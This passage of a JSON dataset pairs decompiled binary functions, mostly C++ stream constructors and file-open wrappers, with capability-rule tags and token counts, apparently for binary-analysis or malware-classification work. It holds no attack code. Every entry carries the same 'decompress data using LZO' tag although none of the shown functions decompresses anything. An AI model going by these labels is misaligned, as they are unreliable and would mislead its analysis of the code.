        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00480eb0(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_ch;\n    \n    fcn.0049b670();\n    in_ECX[0x1d] = 0;\n    *(in_ECX + 0x1e) = 0;\n    *(in_ECX + 0x7a) = 0;\n    in_ECX[0x1f] = 0;\n    in_ECX[0x20] = 0;\n    in_ECX[0x21] = 0;\n    in_ECX[0x22] = 0;\n    *in_ECX = 0x50aaac;\n    in_ECX[1] = 0x50aac0;\n    fcn.0049cca0(arg_8h);\n    return;\n}\n",
        "token_count": 198
    },
    "00480fa0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.00480fa0(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.0049b670();\n    param_1[0x1d] = 0;\n    *(param_1 + 0x1e) = 0;\n    *(param_1 + 0x7a) = 0;\n    param_1[0x1f] = 0;\n    param_1[0x20] = 0;\n    param_1[0x21] = 0;\n    param_1[0x22] = 0;\n    *param_1 = 0x50aaac;\n    param_1[1] = 0x50aac0;\n    fcn.0049cca0(0);\n    return;\n}\n",
        "token_count": 189
    },
    "00481260": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00481260(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t *in_ECX;\n    int32_t iVar4;\n    uchar var_11h;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    \n    fcn.0047fec0();\n    if (var_10h == '\\0') {\n        if (arg_8h != 0) goto code_r0x004812b8;\n        uVar3 = 1;\n        iVar4 = *(*in_ECX + -0xc) + in_ECX;\n    }\n    else {\n        iVar4 = *(*in_ECX + -0xc) + in_ECX;\n        if (arg_8h == 0) {\n            uVar3 = 1;\n        }\n        else {\n            iVar4 = fcn.0049ee40(arg_8h, *(iVar4 + 0x78), &var_11h);\n            if (iVar4 != 0) goto code_r0x004812b8;\n            uVar3 = 4;\n            iVar4 = *(*in_ECX + -0xc) + in_ECX;\n        }\n    }\n    fcn.0049ce20(uVar3 | *(iVar4 + 0x14));\ncode_r0x004812b8:\n    piVar1 = var_ch;\n    iVar4 = *(*var_ch + -0xc);\n    if ((*(var_ch + iVar4 + 0xd) & 0x20) != 0) {\n        cVar2 = fcn.0049e8f0();\n        if ((cVar2 == '\\0') && (piVar1 = *(piVar1 + iVar4 + 0x78),  piVar1 != NULL)) {\n            iVar4 = (**(*piVar1 + 0x18))();\n            if (iVar4 == -1) {\n                fcn.0049ce20(*(var_ch + *(*var_ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 503
    },
    "004816c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.004816c0(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_8h;\n    \n    *in_ECX = 0x50aad0;\n    fcn.0046d6c0(arg_8h);\n    return;\n}\n",
        "token_count": 81
    },
    "00481980": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00481980(int32_t *arg_8h)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    uint *in_ECX;\n    int32_t iVar3;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.0049b670();\n    *in_ECX = 0x5068d0;\n    *(in_ECX + 0x3a) = 0;\n    iVar3 = arg_8h[1];\n    in_ECX[0x39] = 0;\n    in_ECX[1] = iVar3;\n    iVar3 = *arg_8h;\n    in_ECX[0x3b] = 0;\n    iVar3 = *(iVar3 + -0xc);\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    iVar3 = iVar3 + arg_8h;\n    in_ECX[0x1d] = 0x5068e4;\n    in_ECX[0x3e] = 0;\n    fcn.0049ac60(iVar3);\n    fcn.0049c380(in_ECX + 0x38);\n    uVar2 = *(iVar3 + 0x70);\n    *(iVar3 + 0x70) = 0;\n    in_ECX[0x39] = uVar2;\n    *(in_ECX + 0x3a) = *(iVar3 + 0x74);\n    uVar1 = *(iVar3 + 0x75);\n    in_ECX[0x3b] = 0;\n    *(in_ECX + 0xe9) = uVar1;\n    arg_8h[1] = 0;\n    *in_ECX = 0x50aae8;\n    in_ECX[0x1d] = 0x50aafc;\n    fcn.00478340(arg_8h + 2);\n    in_ECX[0x3b] = in_ECX + 2;\n    return;\n}\n",
        "token_count": 474
    },
    "00481ab0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00481ab0(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.0049b670();\n    *in_ECX = 0x5068d0;\n    in_ECX[0x39] = 0;\n    *(in_ECX + 0x3a) = 0;\n    in_ECX[0x3b] = 0;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    in_ECX[0x1d] = 0x5068e4;\n    in_ECX[1] = 0;\n    fcn.0049c4a0(0);\n    *in_ECX = 0x50aae8;\n    in_ECX[0x1d] = 0x50aafc;\n    fcn.00478480();\n    fcn.0049c4a0(in_ECX + 2);\n    iVar1 = fcn.00476e70(arg_8h, arg_ch | 8);\n    if (iVar1 != 0) {\n        fcn.0049c600(0);\n        return;\n    }\n    fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 352
    },
    "00481bf0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00481bf0(uint *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.0049b670();\n    *in_ECX = 0x5068d0;\n    in_ECX[0x39] = 0;\n    *(in_ECX + 0x3a) = 0;\n    in_ECX[0x3b] = 0;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    in_ECX[0x1d] = 0x5068e4;\n    in_ECX[1] = 0;\n    fcn.0049c4a0(0);\n    *in_ECX = 0x50aae8;\n    in_ECX[0x1d] = 0x50aafc;\n    fcn.00478480();\n    fcn.0049c4a0(in_ECX + 2);\n    iVar1 = fcn.00476e70(*arg_8h, arg_ch | 8);\n    if (iVar1 != 0) {\n        fcn.0049c600(0);\n        return;\n    }\n    fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 354
    },
    "00481d30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.00481d30(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.0049b670();\n    *param_1 = 0x5068d0;\n    param_1[0x39] = 0;\n    *(param_1 + 0x3a) = 0;\n    param_1[0x3b] = 0;\n    param_1[0x3c] = 0;\n    param_1[0x3d] = 0;\n    param_1[0x3e] = 0;\n    param_1[0x1d] = 0x5068e4;\n    param_1[1] = 0;\n    fcn.0049c4a0(0);\n    *param_1 = 0x50aae8;\n    param_1[0x1d] = 0x50aafc;\n    fcn.00478480();\n    fcn.0049c4a0(param_1 + 2);\n    return;\n}\n",
        "token_count": 250
    },
    "00481e10": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00481e10(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    int32_t iVar4;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar2 = arg_8h[1];\n    *in_ECX = iVar2;\n    *(in_ECX + *(iVar2 + -0xc)) = arg_8h[2];\n    in_ECX[1] = arg_ch[1];\n    iVar2 = *(iVar2 + -0xc);\n    iVar4 = *(*arg_ch + -0xc) + arg_ch;\n    fcn.0049ac60(iVar4);\n    fcn.0049c380(in_ECX + iVar2 + 0x6c);\n    uVar3 = *(iVar4 + 0x70);\n    *(iVar4 + 0x70) = 0;\n    *(in_ECX + iVar2 + 0x70) = uVar3;\n    *(in_ECX + iVar2 + 0x74) = *(iVar4 + 0x74);\n    uVar1 = *(iVar4 + 0x75);\n    *(in_ECX + iVar2 + 0x78) = 0;\n    *(in_ECX + iVar2 + 0x75) = uVar1;\n    iVar2 = *arg_8h;\n    arg_ch[1] = 0;\n    *in_ECX = iVar2;\n    *(in_ECX + *(iVar2 + -0xc)) = arg_8h[3];\n    fcn.00478340(arg_ch + 2);\n    *(in_ECX + *(*in_ECX + -0xc) + 0x78) = in_ECX + 2;\n    return;\n}\n",
        "token_count": 432
    },
    "00481ef0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00481ef0(int32_t *arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[2];\n    in_ECX[1] = 0;\n    fcn.0049c4a0(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.00478480();\n    fcn.0049c4a0(in_ECX + 2);\n    iVar1 = fcn.00476e70(arg_ch, arg_10h | 8);\n    if (iVar1 != 0) {\n        fcn.0049c600(0);\n        return;\n    }\n    fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 285
    },
    "00481fe0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00481fe0(int32_t *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[2];\n    in_ECX[1] = 0;\n    fcn.0049c4a0(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.00478480();\n    fcn.0049c4a0(in_ECX + 2);\n    iVar1 = fcn.00476e70(*arg_ch, arg_10h | 8);\n    if (iVar1 != 0) {\n        fcn.0049c600(0);\n        return;\n    }\n    fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 287
    },
    "004820d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004820d0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[2];\n    in_ECX[1] = 0;\n    fcn.0049c4a0(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.00478480();\n    fcn.0049c4a0(in_ECX + 2);\n    return;\n}\n",
        "token_count": 193
    },
    "00482510": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00482510(int32_t *arg_8h)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    uint *in_ECX;\n    int32_t iVar3;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.0049b670();\n    *in_ECX = 0x5068f8;\n    *(in_ECX + 0x3b) = 0;\n    iVar3 = arg_8h[1];\n    in_ECX[0x3a] = 0;\n    in_ECX[1] = iVar3;\n    iVar3 = *arg_8h;\n    *(in_ECX + 0xee) = 0;\n    iVar3 = *(iVar3 + -0xc);\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    iVar3 = iVar3 + arg_8h;\n    in_ECX[0x1e] = 0x50690c;\n    in_ECX[0x3e] = 0;\n    in_ECX[0x3f] = 0;\n    fcn.0049ac60(iVar3);\n    fcn.0049cbb0(in_ECX + 0x39);\n    uVar2 = *(iVar3 + 0x70);\n    *(iVar3 + 0x70) = 0;\n    in_ECX[0x3a] = uVar2;\n    *(in_ECX + 0x3b) = *(iVar3 + 0x74);\n    uVar1 = *(iVar3 + 0x76);\n    in_ECX[0x3c] = 0;\n    *(in_ECX + 0xee) = uVar1;\n    arg_8h[1] = 0;\n    *in_ECX = 0x50ab10;\n    in_ECX[0x1e] = 0x50ab24;\n    fcn.0047a310(arg_8h + 2);\n    in_ECX[0x3c] = in_ECX + 2;\n    return;\n}\n",
        "token_count": 489
    },
    "00482640": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00482640(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.0049b670();\n    *(in_ECX + 0xee) = 0;\n    in_ECX[0x3a] = 0;\n    *(in_ECX + 0x3b) = 0;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    in_ECX[0x3f] = 0;\n    *in_ECX = 0x5068f8;\n    in_ECX[0x1e] = 0x50690c;\n    in_ECX[1] = 0;\n    fcn.0049cca0(0);\n    *in_ECX = 0x50ab10;\n    in_ECX[0x1e] = 0x50ab24;\n    fcn.0047a450();\n    fcn.0049cca0(in_ECX + 2);\n    iVar1 = fcn.00478e20(arg_8h, arg_ch | 8);\n    if (iVar1 != 0) {\n        fcn.0049ce20(0);\n        return;\n    }\n    fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 361
    },
    "00482780": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00482780(uint *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.0049b670();\n    *(in_ECX + 0xee) = 0;\n    in_ECX[0x3a] = 0;\n    *(in_ECX + 0x3b) = 0;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x3e] = 0;\n    in_ECX[0x3f] = 0;\n    *in_ECX = 0x5068f8;\n    in_ECX[0x1e] = 0x50690c;\n    in_ECX[1] = 0;\n    fcn.0049cca0(0);\n    *in_ECX = 0x50ab10;\n    in_ECX[0x1e] = 0x50ab24;\n    fcn.0047a450();\n    fcn.0049cca0(in_ECX + 2);\n    iVar1 = fcn.00478e20(*arg_8h, arg_ch | 8);\n    if (iVar1 != 0) {\n        fcn.0049ce20(0);\n        return;\n    }\n    fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 363
    },
    "004828c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.004828c0(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.0049b670();\n    *(param_1 + 0xee) = 0;\n    param_1[0x3a] = 0;\n    *(param_1 + 0x3b) = 0;\n    param_1[0x3c] = 0;\n    param_1[0x3d] = 0;\n    param_1[0x3e] = 0;\n    param_1[0x3f] = 0;\n    *param_1 = 0x5068f8;\n    param_1[0x1e] = 0x50690c;\n    param_1[1] = 0;\n    fcn.0049cca0(0);\n    *param_1 = 0x50ab10;\n    param_1[0x1e] = 0x50ab24;\n    fcn.0047a450();\n    fcn.0049cca0(param_1 + 2);\n    return;\n}\n",
        "token_count": 260
    },
    "004829b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004829b0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uchar uVar1;\n    ushort uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *in_ECX;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar3 = arg_8h[1];\n    *in_ECX = iVar3;\n    *(in_ECX + *(iVar3 + -0xc)) = arg_8h[2];\n    in_ECX[1] = arg_ch[1];\n    iVar3 = *(iVar3 + -0xc);\n    iVar5 = *(*arg_ch + -0xc) + arg_ch;\n    fcn.0049ac60(iVar5);\n    fcn.0049cbb0(in_ECX + iVar3 + 0x6c);\n    uVar4 = *(iVar5 + 0x70);\n    *(iVar5 + 0x70) = 0;\n    *(in_ECX + iVar3 + 0x70) = uVar4;\n    uVar2 = *(iVar5 + 0x74);\n    uVar1 = *(iVar5 + 0x76);\n    *(in_ECX + iVar3 + 0x78) = 0;\n    *(in_ECX + iVar3 + 0x74) = uVar2;\n    *(in_ECX + iVar3 + 0x76) = uVar1;\n    iVar3 = *arg_8h;\n    arg_ch[1] = 0;\n    *in_ECX = iVar3;\n    *(in_ECX + *(iVar3 + -0xc)) = arg_8h[3];\n    fcn.0047a310(arg_ch + 2);\n    *(in_ECX + *(*in_ECX + -0xc) + 0x78) = in_ECX + 2;\n    return;\n}\n",
        "token_count": 449
    },
    "00482a90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00482a90(int32_t *arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[2];\n    in_ECX[1] = 0;\n    fcn.0049cca0(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.0047a450();\n    fcn.0049cca0(in_ECX + 2);\n    iVar1 = fcn.00478e20(arg_ch, arg_10h | 8);\n    if (iVar1 != 0) {\n        fcn.0049ce20(0);\n        return;\n    }\n    fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 282
    },
    "00482b80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00482b80(int32_t *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[2];\n    in_ECX[1] = 0;\n    fcn.0049cca0(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.0047a450();\n    fcn.0049cca0(in_ECX + 2);\n    iVar1 = fcn.00478e20(*arg_ch, arg_10h | 8);\n    if (iVar1 != 0) {\n        fcn.0049ce20(0);\n        return;\n    }\n    fcn.0049ce20(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 284
    },
    "00482c70": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00482c70(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[2];\n    in_ECX[1] = 0;\n    fcn.0049cca0(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[3];\n    fcn.0047a450();\n    fcn.0049cca0(in_ECX + 2);\n    return;\n}\n",
        "token_count": 190
    },
    "00483070": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00483070(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_ch;\n    \n    fcn.0049b670();\n    in_ECX[0x1f] = 0;\n    *(in_ECX + 0x20) = 0;\n    *(in_ECX + 0x82) = 0;\n    in_ECX[0x21] = 0;\n    in_ECX[0x22] = 0;\n    in_ECX[0x23] = 0;\n    in_ECX[0x24] = 0;\n    *in_ECX = 0x506920;\n    in_ECX[3] = 0x506934;\n    in_ECX[1] = 0;\n    fcn.0049cca0(arg_8h);\n    in_ECX[2] = 0x506948;\n    in_ECX[3] = 0x50695c;\n    fcn.0049cca0(arg_8h);\n    *in_ECX = 0x50ab38;\n    in_ECX[3] = 0x50ab60;\n    in_ECX[2] = 0x50ab4c;\n    return;\n}\n",
        "token_count": 289
    },
    "00483150": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.00483150(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.0049b670();\n    param_1[0x1f] = 0;\n    *(param_1 + 0x20) = 0;\n    *(param_1 + 0x82) = 0;\n    param_1[0x21] = 0;\n    param_1[0x22] = 0;\n    param_1[0x23] = 0;\n    param_1[0x24] = 0;\n    *param_1 = 0x506920;\n    param_1[3] = 0x506934;\n    param_1[1] = 0;\n    fcn.0049cca0(0);\n    param_1[2] = 0x506948;\n    param_1[3] = 0x50695c;\n    fcn.0049cca0(0);\n    *param_1 = 0x50ab38;\n    param_1[3] = 0x50ab60;\n    param_1[2] = 0x50ab4c;\n    return;\n}\n",
        "token_count": 278
    },
    "004832e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.004832e0(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[2];\n    in_ECX[1] = 0;\n    fcn.0049cca0(arg_ch);\n    iVar1 = arg_8h[3];\n    in_ECX[2] = iVar1;\n    *(in_ECX + *(iVar1 + -0xc) + 8) = arg_8h[4];\n    fcn.0049cca0(arg_ch);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[5];\n    in_ECX[2] = arg_8h[6];\n    return;\n}\n",
        "token_count": 244
    },
    "00483370": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.00483370(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_8h;\n    \n    iVar1 = arg_8h[1];\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[2];\n    in_ECX[1] = 0;\n    fcn.0049cca0(0);\n    iVar1 = arg_8h[3];\n    in_ECX[2] = iVar1;\n    *(in_ECX + *(iVar1 + -0xc) + 8) = arg_8h[4];\n    fcn.0049cca0(0);\n    iVar1 = *arg_8h;\n    *in_ECX = iVar1;\n    *(in_ECX + *(iVar1 + -0xc)) = arg_8h[5];\n    in_ECX[2] = arg_8h[6];\n    return;\n}\n",
        "token_count": 243
    },
    "00483710": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00483710(int32_t *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    int32_t iVar2;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.0049b670();\n    *in_ECX = 0x506970;\n    *(in_ECX + 0x39) = 0;\n    iVar2 = *arg_8h;\n    in_ECX[0x38] = 0;\n    iVar2 = *(iVar2 + -0xc);\n    in_ECX[0x3a] = 0;\n    in_ECX[0x3b] = 0;\n    iVar2 = iVar2 + arg_8h;\n    in_ECX[0x1c] = 0x506984;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    fcn.0049ac60(iVar2);\n    fcn.0049c380(in_ECX + 0x37);\n    uVar1 = *(iVar2 + 0x70);\n    *(iVar2 + 0x70) = 0;\n    in_ECX[0x38] = uVar1;\n    *(in_ECX + 0x39) = *(iVar2 + 0x74);\n    *(in_ECX + 0xe5) = *(iVar2 + 0x75);\n    in_ECX[0x3a] = 0;\n    *in_ECX = 0x50ab74;\n    in_ECX[0x1c] = 0x50ab88;\n    fcn.00478340(arg_8h + 1);\n    in_ECX[0x3a] = in_ECX + 1;\n    return;\n}\n",
        "token_count": 418
    },
    "00483820": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00483820(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.0049b670();\n    *in_ECX = 0x506970;\n    in_ECX[0x38] = 0;\n    *(in_ECX + 0x39) = 0;\n    in_ECX[0x3a] = 0;\n    in_ECX[0x3b] = 0;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x1c] = 0x506984;\n    fcn.0049c4a0(0);\n    *in_ECX = 0x50ab74;\n    in_ECX[0x1c] = 0x50ab88;\n    fcn.00478480();\n    fcn.0049c4a0(in_ECX + 1);\n    iVar1 = fcn.00476e70(arg_8h, arg_ch | 0x10);\n    if (iVar1 != 0) {\n        fcn.0049c600(0);\n        return;\n    }\n    fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 336
    },
    "00483940": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00483940(uint *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_ch;\n    \n    fcn.0049b670();\n    *in_ECX = 0x506970;\n    in_ECX[0x38] = 0;\n    *(in_ECX + 0x39) = 0;\n    in_ECX[0x3a] = 0;\n    in_ECX[0x3b] = 0;\n    in_ECX[0x3c] = 0;\n    in_ECX[0x3d] = 0;\n    in_ECX[0x1c] = 0x506984;\n    fcn.0049c4a0(0);\n    *in_ECX = 0x50ab74;\n    in_ECX[0x1c] = 0x50ab88;\n    fcn.00478480();\n    fcn.0049c4a0(in_ECX + 1);\n    iVar1 = fcn.00476e70(*arg_8h, arg_ch | 0x10);\n    if (iVar1 != 0) {\n        fcn.0049c600(0);\n        return;\n    }\n    fcn.0049c600(*(in_ECX + *(*in_ECX + -0xc) + 0x14) | 4);\n    return;\n}\n",
        "token_count": 338
    },
    "00483a60": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __fastcall fcn.00483a60(uint *param_1)\n\n{\n    uint var_ch;\n    \n    fcn.0049b670();\n    *param_1 = 0x506970;\n    param_1[0x38] = 0;\n    *(param_1 + 0x39) = 0;\n    param_1[0x3a] = 0;\n    param_1[0x3b] = 0;\n    param_1[0x3c] = 0;\n    param_1[0x3d] = 0;\n    param_1[0x1c] = 0x506984;\n    fcn.0049c4a0(0);\n    *param_1 = 0x50ab74;\n    param_1[0x1c] = 0x50ab88;\n    fcn.00478480();\n    fcn.0049c4a0(param_1 + 1);\n    return;\n}\n",
        "token_count": 233
    },
    "00483b30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
